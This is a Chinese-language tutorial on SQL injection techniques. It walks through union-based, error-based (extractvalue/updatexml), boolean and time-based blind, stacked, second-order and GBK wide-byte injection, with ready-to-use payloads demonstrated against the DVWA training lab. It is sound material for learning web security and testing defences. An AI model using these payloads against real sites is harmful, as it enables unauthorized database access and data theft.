SQL 注入

什么是 SQL 注入

例如：一个网站提供了一个功能，根据用户输入的 user ID 查询用户信息



用户输入 1，对应 SQL 语句为：

SELECT first_name,last_name FROM users WHERE id = 1;

发生注入

恶意用户可以输入 1 or 1=1，获取全表，执行 SQL 语句为

SELECT first_name,last_name FROM users WHERE id = 1 or 1=1;

成因

用户输入的内容，被作为 SQL 指令进行了执行

SQL 注入的危害

SQL 注入属于高危漏洞

可以获取敏感信息，修改信息，脱裤，上传 webshell，执行命令

判断参数类型

数值型

  1. 输入框中输入 1'，报 sql 语法错误，证明我们输入的内容被解析了，对应 sql 代码（单引号未闭合）
SELECT first_name,last_name FROM users WHERE id = 1';
  1. 输入框中输入 1 and 1=1，正常输出，与原始页面无差异
  2. 输入框中输入 1 and 1=2，正常执行，但无结果

通过以上三个步骤，判断为数值型 sql 注入

字符型

字符型需要用单引号来闭合，正常 sql 语句如下

SELECT first_name,last_name FROM users WHERE id = '1';

此时可以输入 1' or 1=1#，测试注入，对应的 sql 语句为

SELECT first_name,last_name FROM users WHERE id = '1' or 1=1#'

井号 # 为注释，DVWA 中就是字符型注入

Union 注入

UNION

UNIOIN 用于合并多个相似查询的结果，查询的列数需要相同

mysql> SELECT user_id,first_name FROM users WHERE user_id = 1 UNION ALL SELECT user_id,first_name FROM users WHERE user_id = 2;
+---------+------------+
| user_id | first_name |
+---------+------------+
|       1 | admin      |
|       2 | Gordon     |
+---------+------------+

我们一般使用 UNION ALL 避免去重

联合注入过程

  1. 判断注入点
  2. 判断是整形还是字符型
  3. 判断列数、判断显示位
  4. 获取所有数据库名
  5. 获取数据库所有表名、字段名、字段中的数据

补充

MySQL 5.0 以上自带一个名为 information_schema 的数据库。information_schema 包含三个表非常重要

  1. schemata：表里包含所有数据库的名字
  2. tables：表里包含所有数据库的所有表信息
  3. columns：列信息

group_concat 函数可以将相同字段多行合并，例如：

1' union all select 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name = 'users' #

报错注入

利用 mysql 报错信息

我们利用这 2 个函数的报错信息

  • extractvalue()
  • updatexml()

extractvalue

语法：
extractvalue(XML_document，xpath_string)

用法：
我们传入一个错误的 xpath 路径触发报错

mysql> SELECT * FROM users WHERE user_id = 1 and (extractvalue(1,concat(0x7e,database())));
ERROR 1105 (HY000): XPATH syntax error: '~dvwa'

# 使用 concat 构造字符串 "~dvwa"，0x7e 为字符 '~'

注意：xmlpath 长度限制 32 位

updatexml

语法：
updatexml(XML_document, XPath_string,new_value)

布尔盲注

在页面中，我们输入查询信息后，页面不返回查询的详细信息，而只返回有结果或无结果

构造测试

id input output
1 1 Exists
2 ' Missing
3 1 and 1 = 1 # Exists
4 1 and 1 = 2 # Exists
5 1' and 1 = 1 # Exists
6 1' and 1 = 2 # Missing

由语句 5 和 6 构造真假条件返回对应不同的结果，可知存在字符型的 SQL 盲注漏洞

猜解数据库名称长度

二分法

1' and length(database())>10#  Missing
1' and length(database())>5#  Missing
1' and length(database())>3#  Exists
1' and length(database())>4#  Exists

猜解数据库名称

先获取数据库名称的第一个字符然后跟 ascii 码值一个个对比

1' and ascii(substr(database(),1,1)) > 88#  Exists
1' and ascii(substr(database(),1,1)) > 98#  Exists
1' and ascii(substr(database(),1,1)) > 100#  Missing
1' and ascii(substr(database(),1,1)) = 100#  Exists

数据库名称第一个字母的 ascii 值为 100，字母为 d

以此类推，分别猜解第 2、3、4 位元素

1' and ascii(substr(database(),2,1)) = 118#  第二位字符为 v
1' and ascii(substr(database(),3,1)) = 119#  第三位字符为 w
1' and ascii(substr(database(),4,1)) = 97#  第四位字符为 a

从而获得数据库名称为 dvwa

猜解表个数

1' and (select count(table_name) from information_schema.tables where table_schema=database())>10#  Missing
1' and (select count(table_name) from information_schema.tables where table_schema=database())>5#  Missing
1' and (select count(table_name) from information_schema.tables where table_schema=database())>2#  Missing
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#  Exists

dvwa 数据库中表个数为 2

时间盲注

页面返回值只有一种 True，无论输入何值，返回情况都按正常来处理。此时可以加入时间函数，通过返回时间都长短来判断注入的语句是否正确

猜解数据库名称

1' and if(length(database())=4,sleep(5),1)#

# 条件为真，睡眠 5 s，条件为假返回 1 （True）

可以按 F12，打开调试，从 Network 中查看，接口用时

堆叠注入

通过加入分号 ; 构造多条语句让数据库执行。危害极大，增删改查毫无限制

使用条件

堆叠注入使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制，只有当调用数据库的函数支持执行多条语句时才能够使用

利⽤ mysqli_multi_query() 函数就⽀持多条 sql 语句同时执⾏，但实际情况中，如 PHP 为了防⽌ sql 注⼊机制，往往使⽤调⽤数据库的函数是mysqli_query() 函数，其只能执⾏⼀条语句

二次注入

一个网站对我们的输入进行了过滤，例如转义特殊字符，我们输入的 1' 被转义为 1\'。如果我们插入数据时，后端仅仅使用了 addslashes 进行转义，数据插入数据库时，\ 会被自动摘除，数据库中保存的是原始信息。我们再通过其他方法访问这段数据，引导恶意指令被执行

二次注入的两个步骤

  1. 插入恶意数据
  2. 引用恶意数据

例子：

  1. 找到一个写入数据的功能，输入恶意信息例如 1'
  2. 数据被转义成 1\'
  3. 数据被存入数据库后为 1'
  4. 找到另一处引用这个数据的操作
  5. 数据被取出，但没有经过过滤 1'
  6. 注入发生 insert into table values('1'')

宽字节注入

宽字节注⼊时利⽤ mysql 的⼀个特性，使⽤ GBK 编码的时候，会认为两个字符是⼀个汉字

addslashes 函数

addslashes() 函数返回在预定义字符之前添加反斜杠 \ 的字符串

预定义字符

  • 单引号（'）
  • 双引号（"）
  • 反斜杠（\）
  • NULL

字符型的注入点我们都是用单引号来判断的，当遇到 addslashes() 时，单引号会被转义，导致我们用来判断注入点的单引号失效。所以我们的目的就是使转义符 \ 失效，是单引号逃逸

注入原理

#恶意代码
kobe%df' or 1=1#

#转义后
kobe%df\' or 1=1#

#Ascii码
%5c = \
%27 = '

#所以等效于
kobe%df%5c%27 or 1=1#

# 因为
%df%5c 是 GBK 字符 運，被一起解析了，%27 逃逸

# 最终等效代码
kobe運' or 1=1#
